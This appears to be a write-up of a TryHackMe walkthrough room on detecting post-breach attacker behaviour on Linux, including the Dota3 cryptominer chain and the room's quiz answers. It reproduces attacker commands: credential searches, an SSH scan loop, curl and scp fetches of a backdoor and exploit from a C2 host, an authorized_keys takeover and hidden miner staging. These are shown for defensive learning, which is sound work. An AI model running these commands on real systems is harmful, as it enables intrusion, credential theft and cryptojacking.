---
icon: linux
cover: >-
  https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/678ecc92c80aa206339f0f23-1757085942981
coverY: 0
coverHeight: 138
---

# Linux Threat Detection 2

**Date:** 06.05.2026&#x20;

**Room Category:** Walkthrough&#x20;

**Core Concept:** Analyzing the post-breach behavior of adversaries on Linux servers. This includes exploring Discovery methodologies, Ingress Tool Transfer techniques, and dissecting a real-world cryptominer attack chain (Dota3).

After a threat actor gains Initial Access to a Linux system, their immediate actions dictate the trajectory of the attack. Understanding these commands and recognizing their signatures within system logs is critical for timely incident response.

***

## Task 1: Introduction

This room explores what happens immediately after a Linux system is compromised. The objective is to identify Discovery commands in logs, understand common "Hack and Forget" threats, observe how attackers stage malware, and practice uncovering a real cryptominer infection from start to finish.

Question: I'm ready to learn!

> **Answer:** No answer needed

***

## Task 2: Discovery Overview

When botnets automate Initial Access (such as brute-forcing SSH), human attackers are often handed a command-line interface with no context about the system they just breached. Therefore, their first step is usually extensive Discovery.

<figure><img src="../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

**Basic Discovery Categories & Typical Commands:**

*   **OS and Filesystem Discovery:**

    ```bash
    pwd
    ls /
    env
    uname -a
    lsb_release -a
    hostname
    ```
*   **User and Groups Discovery:**

    ```bash
    id
    whoami
    w
    last
    cat /etc/sudoers
    cat /etc/passwd
    ```
*   **Process and Network Discovery:**

    ```bash
    ps aux
    top
    ip a
    ip r
    arp -a
    ss -tnlp
    netstat -tnlp
    ```
*   **Cloud or Sandbox Discovery:**

    ```bash
    systemd-detect-virt
    lsmod
    uptime
    pgrep "<edr-or-sandbox>"
    ```

_Note: While legitimate applications rarely need to execute `whoami`, adversaries almost always run it immediately after breaching a service. Implementing a detection rule for unexpected `whoami` execution is a highly effective SOC strategy._

Question: Run systemd-detect-virt to detect the system's cloud. What is the command's output you discovered?

> **Answer:** Amazon

Question: Now run ps aux and look for EDR or antivirus processes. What is the full path to the detected antimalware binary?

> **Answer:** /var/lib/ultrasec/malscan

***

## Task 3: Detecting Discovery

Beyond generic situational awareness, attackers utilize specialized Discovery commands tailored to their specific objectives.

<figure><img src="../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

**Specialized Discovery Commands:**

*   **Find and steal credentials and sensitive data:**

    ```bash
    history | grep pass
    find / -name .env
    find /home -name id_rsa
    ```
*   **Identify system suitability for cryptocurrency mining:**

    ```bash
    cat /proc/cpuinfo
    lscpu | grep Model
    free -m
    top
    htop
    ```
*   **Scan the internal network for future victims:**

    ```bash
    ping <ip>
    for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done
    ```

**Detecting Discovery via Process Trees:** Context is critical when evaluating Discovery commands. An IT member using `find` and `grep` might be normal, but a web server daemon unexpectedly spawning `whoami` is a massive red flag. Building a process tree with `ausearch` clarifies the origin.

```bash
# Look for a Discovery command like whoami
ubuntu@thm-vm:~$ ausearch -i -x whoami 
type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3907 auid=ubuntu uid=ubuntu exe=/usr/bin/whoami

# Identify its parent process, a lp.sh script
ubuntu@thm-vm:~$ ausearch -i --pid 3898 
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/bash /tmp/lp.sh
type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3840 pid=3898 auid=ubuntu uid=ubuntu exe=/usr/bin/bash

# Look for other processes created by the lp.sh
ubuntu@thm-vm:~$ ausearch -i --ppid 3898 
[Five more commands like "find /home -name *secret*" confirming the script is malicious]
```

Question: What is the path of the script that initiated the "hostname" command?

> **Answer:** /home/itsupport/debug.sh

Question: What was the last Discovery command launched by the script?

> **Answer:** ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu

Question: Looking at the script content, what's the email of the script author?

> **Answer:** greg@tryhackme.thm

***

## Task 4: Motivation for Attacks

<figure><img src="../.gitbook/assets/image (324).png" alt="" width="375"><figcaption></figcaption></figure>

Many automated Linux attacks fall into the "Hack and Forget" category. These operate at scale and focus on quick gains rather than targeted espionage. Common outcomes include:

1. **Installing Cryptominers**
2. **Enrolling into Botnets (e.g., Mirai)**
3. **Using the victim as a Proxy**

**Ingress Tool Transfer:** To execute these objectives, attackers must download secondary payloads onto the victim's machine. The three most common utilities abused for this are `wget`, `curl`, and `scp`.

```bash
# Wget: Download a file from the website
wget [https://github.com/xmrig/](https://github.com/xmrig/)[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz

# Curl: Make a request to the webpage
curl --output /var/www/html/backdoor.php "[https://pastebin.thm/yTg0Ah6a](https://pastebin.thm/yTg0Ah6a)"

# SSH: Transfer a file via SCP or SFTP
scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh
```

**Detecting SCP Transfers:** When malware is transferred via SCP, the detection method depends on the direction of the connection.

```bash
# Option 1: Attacker Connects to Victim (Push)
attacker@attack-vm:~$ scp ./malware.sh ubuntu@thm-vm:/tmp
[OK] Connecting to thm-vm machine via SSH...
[OK] Logged in on thm-vm via SSH as "ubuntu"
[OK] File transferred from attack-vm to thm-vm
[OK] Job is done, logging out from thm-vm
# Detection: Look for successful SSH logins in /var/log/auth.log

# Option 2: Victim Connects to Attacker (Pull)
ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp
[OK] Connecting to attack-vm machine via SSH...
[OK] Logged in on attack-vm via SSH as "attacker"
[OK] File transferred from attack-vm to thm-vm
[OK] Job is done, logging out from attack-vm
# Detection: Look for the "scp" command in Auditd logs
```

**Additional Detection Sources:**

* **Network Traffic:** Identifying downloads from suspicious domains, previously seen malicious IPs, or unexpected public repositories like GitHub.
* **File Events:** Detecting new file creations in staging directories (`/tmp`, `/var/tmp`), especially those utilizing known malicious naming conventions (`shell.php`, `exploit`).

Question: From which domain was the Elastic agent downloaded?

> **Answer:** artifacts.elastic.co

Question: What is the full path to the downloaded "helper.sh" script?

> **Answer:** /var/tmp/helper.sh

Question: Which of the downloaded files is more likely to be malicious: The one downloaded with curl or wget?

> **Answer:** curl

***

## Task 5: Dota3: First Actions

The Dota3 malware perfectly illustrates a real-world "Hack and Forget" attack chain.

**1. Initial Access** A massive botnet scans the internet for open SSH ports and brute-forces the `root` user using common weak passwords. Once successful, the attacker accesses the victim via SSH.

**2. Discovery** The threat actor executes a rapid sequence of discovery commands specifically targeting CPU and RAM details (classic cryptominer behavior).

```bash
# Checks CPU and RAM information
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
lscpu | grep Model

# Unclear purpose
ls -lh $(which ls)

# Generic Discovery
crontab -l 
w
uname -m
```

**3. Persistence & Hostile Takeover** To prevent rival botnets from taking over and to lock out the legitimate system owner, the attacker changes the password and overwrites the SSH authorized keys with their own (leaving a distinct "mdrfckr" signature).

```bash
echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash >> up.txt
cd ~
rm -rf .ssh
mkdir .ssh
# Note the "mdrfckr" comment, unique to this attack
echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys
chmod -R go= ~/.ssh
```

**Detection Methodologies:**

```bash
# Auth Logs: Look for successful SSH logins by password from untrusted external IP addresses.
cat /var/log/auth.log | grep "Accepted"

# Auditd Process Logs: Look for execution of Discovery commands and trace their origin.
ausearch -i -x [command]

# Querying specific scenario audit logs
ausearch -i -if /home/ubuntu/scenario/audit.log
```

Question: Which IP address managed to brute-force the exposed SSH?

> **Answer:** 45.9.148.125

Question: Which command did the attacker use to list the last logged-in users?

> **Answer:** last

Question: Which three EDR processes did the attacker look for with "egrep"?

> **Answer:** ds\_agent,falcon,sentinel

***

## Task 6: Dota3: Miner Setup

After securing their foothold, the threat actors stage the cryptominer and supplementary tools.

**Malware Transfer & Staging:** The attacker uploads the malware via SCP and unpacks it into a deceptive, hidden directory structure within `/tmp` designed to blend in with legitimate Unix processes.

```bash
# Attacker transfers the archive
user@bot-1672$ scp dota3.tar.gz ubuntu@victim:/tmp

# Prepare a hidden /tmp/.X26-unix folder for malware
cd /tmp
rm -rf .X2*
mkdir .X26-unix
cd .X26-unix

# Unarchive malware to /tmp/.X26-unix/.rsync/c folder
tar xf dota3.tar.gz
sleep 3s
cd /tmp/.X26-unix/.rsync/c
```

**Execution:** Two binaries are executed using the `nohup` command. `tsm` is a network scanner used to probe the internal network for more vulnerable SSH services, and `initall` is the XMRig cryptominer. Utilizing `nohup` ensures the malware continues to run in the background even after the attacker terminates the SSH session.

```bash
# Scan the internal network with the "tsm" malware
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1&
sleep 8m
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>1&
sleep 20m

# Run the actual cryptominer named "initall"
cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&

# That's it, Dota3 attack is now completed!
exit 0
```

**Detection Indicators:**

* Creation of untrusted, hidden files (`.X26-unix`) in the `/tmp` directory.
* Auditd logging the extraction of archives named similarly to known malware (`dota3.tar.gz`, `kernupd.tar.gz`).
* Execution of `nohup` combined with unusual file paths.
* Network traffic indicating internal SSH port scanning (port 22) across `192.168.*` or `172.16.*` subnets.

Question: What is the name of the malicious archive that was transferred via SCP?

> **Answer:** kernupd.tar.gz

Question: What was the full command line of the cryptominer launch?

> **Answer:** nohup /tmp/.apt/kernupd/kernupd

Question: Which IP address range did the attacker scan for an exposed SSH?

> **Answer:** 10.10.12.1-10.10.12.10

***

## Conclusion

This room explored the full lifecycle of "Hack and Forget" attacks on Linux infrastructure. Automated botnets frequently execute these attacks at scale, heavily relying on built-in utilities (`ls`, `cat`, `wget`, `ssh`) for Discovery and Ingress Tool Transfer. Leveraging `auditd` and process tree analysis alongside authentication logs is the most robust approach to unmasking these threats.
